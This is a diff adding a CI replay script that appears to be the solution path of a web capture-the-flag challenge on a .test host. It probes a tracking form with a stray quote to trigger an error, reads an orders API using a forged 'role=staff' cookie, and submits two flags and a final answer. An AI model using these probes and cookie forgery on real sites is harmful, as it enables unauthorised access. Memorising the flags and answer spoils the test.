@@ -1,0 +1,9 @@
+# The chatty tracking form: the shortest path, replayed by CI in every language.
+curl https://www.atelier-pixel.test/suivi
+curl -d "ref=PX-1042" https://www.atelier-pixel.test/suivi
+curl -d "ref=PX-1042'" https://www.atelier-pixel.test/suivi
+submit FLAG{pixel-quote-error-8b21}
+curl https://www.atelier-pixel.test/api/orders
+curl -b "role=staff" https://www.atelier-pixel.test/api/orders | jq -r .backoffice.audit_marker
+submit FLAG{pixel-cookie-role-3e17}
+answer server
